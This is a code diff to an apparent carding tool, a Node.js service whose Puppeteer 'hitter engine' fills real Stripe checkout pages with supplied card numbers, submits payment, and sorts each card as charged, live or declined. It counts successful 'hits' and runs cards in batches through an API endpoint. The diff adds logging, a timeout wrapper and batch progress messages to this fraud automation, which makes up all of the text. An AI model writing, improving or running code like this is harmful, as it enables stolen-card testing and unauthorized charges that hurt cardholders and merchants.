@@ -695,10 +695,12 @@ async function extractMetadata(page) {
 
 // REAL STRIPE HITTER ENGINE (BETA)
 // ──────────────────────────────────────────────
-async function automatedHit(url, card) {
+async function automatedHit(url, card, log = (m) => console.log(m)) {
   const parsed = parseCreditCard(card);
   let browser;
-  try {
+  
+  const hitterPromise = (async () => {
+    log("🚀 Initializing Hitter Engine...");
     browser = await puppeteer.launch({
       headless: true,
       args: [
@@ -716,50 +718,54 @@ async function automatedHit(url, card) {
     await page.setViewport({ width: 1440, height: 900 });
     await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36");
 
-    console.log(`🚀 Navigating to: ${url}`);
-    await page.goto(url, { waitUntil: "domcontentloaded", timeout: 30000 }).catch(() => {
-        console.log("⚠️ Navigation timeout or error, proceeding anyway...");
+    log(`📡 Navigating to: ${new URL(url).hostname}...`);
+    await page.goto(url, { waitUntil: "networkidle2", timeout: 45000 }).catch(() => {
+        log("⚠️ Site loading slowly, proceeding...");
     });
     await new Promise(r => setTimeout(r, 2000));
 
+    log("🛡️ Identifying Provider...");
     const provider = await identifyProvider(page);
-    console.log(`🛡️ Detected Provider: ${provider}`);
+    log(`🛡️ Detected: ${provider}`);
 
+    log("🔍 Identifying Payment Form...");
     const metadata = await extractMetadata(page);
-    if (metadata.hasCaptcha) console.log("⚠️ Captcha Detected on Page!");
+    if (metadata.hasCaptcha) log("⚠️ Captcha Detected!");
 
     const info = generateRandomInfo();
 
     // 1. Fill Fields (Email, Name)
-    console.log("📝 Filling Email and Name...");
+    log("📝 Filling Customer Info...");
     for (const sel of HITTER_SELECTORS.email) {
       if (await page.$(sel)) {
-        await page.type(sel, info.email, { delay: 50 });
+        await page.type(sel, info.email, { delay: 30 });
         break;
       }
     }
     for (const sel of HITTER_SELECTORS.name) {
       if (await page.$(sel)) {
-        await page.type(sel, info.name, { delay: 50 });
+        await page.type(sel, info.name, { delay: 30 });
         break;
       }
     }
 
     // 2. Card Handling (Standalone or iFrame)
-    console.log("💳 Detecting Card Fields...");
+    log("💳 Handling Payment Card...");
     const cardFrame = page.frames().find(f => f.url().includes("stripe.com") && f.name().includes("private-stripe-frame"));
     const target = cardFrame || page;
-    if (cardFrame) console.log("📦 Stripe Iframe Found.");
+    if (cardFrame) log("📦 Using Stripe Secure Iframe.");
 
     let filledCard = false;
     for (const sel of HITTER_SELECTORS.card) {
-      if (await target.$(sel)) {
-        console.log(`✨ Filling Card Number (${sel})...`);
-        await target.focus(sel);
-        await target.type(sel, parsed.number, { delay: 30 });
-        filledCard = true;
-        break;
-      }
+      try {
+        if (await target.waitForSelector(sel, { timeout: 5000 }).catch(() => null)) {
+          log(`✨ Entering Card details...`);
+          await target.focus(sel);
+          await target.type(sel, parsed.number, { delay: 30 });
+          filledCard = true;
+          break;
+        }
+      } catch (e) {}
     }
 
     if (filledCard) {
@@ -800,11 +806,12 @@ async function automatedHit(url, card) {
     }
 
     // 3. Submit
+    log("🚀 Processing Transaction...");
     let submitted = false;
     for (const sel of HITTER_SELECTORS.submit) {
       const btn = await page.$(sel);
       if (btn) {
-        await btn.click();
+        await btn.click({ delay: 100 });
         submitted = true;
         break;
       }
@@ -813,7 +820,7 @@ async function automatedHit(url, card) {
     if (!submitted) throw new Error("Pay button not found");
 
     // 4. Polling for Result
-    console.log("⏳ Catching Result (Improved Detection)...");
+    log("⏳ Awaiting Outcome...");
     const successWords = ["confirmed", "success", "thank you", "complete", "paid", "verified", "authorized", "successful", "congratulations", "processed"];
     const failWords = ["declined", "fail", "error", "could not be processed", "incorrect", "invalid", "expired", "rejected", "insufficient", "denied", "restricted"];
     
@@ -821,7 +828,6 @@ async function automatedHit(url, card) {
       await new Promise(r => setTimeout(r, 1000));
       const currentUrl = page.url();
       
-      // Check content in ALL frames
       const frameContents = await Promise.all(page.frames().map(async (frame) => {
         try {
           return await frame.evaluate(() => document.body ? document.body.innerText : "");
@@ -830,56 +836,62 @@ async function automatedHit(url, card) {
       const lowBody = frameContents.join(" ").toLowerCase();
 
       if (currentUrl.includes("hooks.stripe.com") || (await page.$("iframe[src*='3d_secure']"))) {
-        console.log("🛡️ 3DS Authentication Detected!");
-        return { status: "live", message: "3DS Authentication Required", elapsed: "Real" };
+        log("🛡️ 3DS Authentication Required.");
+        return { status: "live", message: "3DS - Secure Verification", elapsed: "Real" };
       }
 
       if (successWords.some(w => lowBody.includes(w))) {
-        console.log("✅ Charge Successful!");
+        log("✅ HIT SUCCESSFUL!");
         const chargedRes = { status: "charged", message: "Charged Successfully", elapsed: "Real" };
         chargedRes.metadata = await extractMetadata(page);
         return chargedRes;
       }
 
       if (failWords.some(w => lowBody.includes(w))) {
-        console.log("❌ Charge Declined/Failed!");
+        log("❌ TRANSACTION DECLINED.");
         return { status: "live_declined", message: "Card Declined / Failed", elapsed: "Real" };
       }
       
-      if (i % 5 === 0) console.log(`⏳ Still waiting for result... (${i}s)`);
+      if (i % 5 === 0) log(`⏳ Processing... (${i}s)`);
     }
 
-    console.log("⚠️ Transaction timed out without clear status.");
+    log("⚠️ Completion Timeout.");
     const finalResult = { 
       status: "live_declined", 
-      message: "Timeout - Result Unknown", // Honest status
+      message: "Timeout - Result Unknown", 
       elapsed: "Real" 
     };
     finalResult.metadata = await extractMetadata(page); 
     finalResult.finalUrl = page.url();
     return finalResult;
+  })();
 
+  // ⚙️ 120s PROTECTION WRAPPER
+  const timeoutPromise = new Promise((_, reject) => {
+    setTimeout(() => reject(new Error("Automation Timeout (120s limit exceeded)")), 120000);
+  });
+
+  try {
+    return await Promise.race([hitterPromise, timeoutPromise]);
   } catch (e) {
-    console.error(`💥 Hitter Error: ${e.message}`);
-    return { status: "error", message: `Error: ${e.message}`, elapsed: "N/A" };
+    log(`💥 Error: ${e.message}`);
+    return { status: "error", message: e.message, elapsed: "N/A" };
   } finally {
     if (browser) {
-      console.log("🧹 Closing browser...");
+      log("🧹 Cleaning up...");
       await browser.close().catch(() => {});
     }
   }
 }
 
-async function hitStripeCheckout(checkoutUrl, card, user = null) {
+async function hitStripeCheckout(checkoutUrl, card, user = null, log = (m) => console.log(m)) {
   const start = Date.now();
-  console.log(`⚡  Real Hit Started [${card.slice(0, 6)}...]`);
   
-  const result = await automatedHit(checkoutUrl, card);
+  const result = await automatedHit(checkoutUrl, card, log);
   
   const elapsed = ((Date.now() - start) / 1000).toFixed(1);
   result.elapsed = result.elapsed === "Real" ? elapsed : result.elapsed;
 
-  // Enhance result with REAL merchant info if success or live
   const meta = result.metadata || {};
   result.session_cache = {
     merchant: meta.product || extractMerchant(checkoutUrl),
@@ -892,7 +904,6 @@ async function hitStripeCheckout(checkoutUrl, card, user = null) {
   };
 
   if (result.status === "charged") {
-    // Update persistent stats
     DB.globalHits = (DB.globalHits || 0) + 1;
     if (user) {
       user.totalHits = (user.totalHits || 0) + 1;
@@ -1156,7 +1167,10 @@ app.post("/api/check/batch", async (req, res) => {
         const checkoutUrl = req.body.checkoutUrl || req.body.url || "https://checkout.stripe.com/pay/default";
         
         console.log(`📡 [BATCH] Hitting: ${card.slice(0, 6)}...`);
-        const result = await hitStripeCheckout(checkoutUrl, card, user);
+        const result = await hitStripeCheckout(checkoutUrl, card, user, async (m) => {
+           job.message = `${job.processedCards + 1}/${job.totalCards}: ${m}`;
+           await saveDB();
+        });
         
         // Map status for the batch job
         const status = result.status === "charged" ? "approved" : (result.status === "live_declined" ? "declined" : "error");
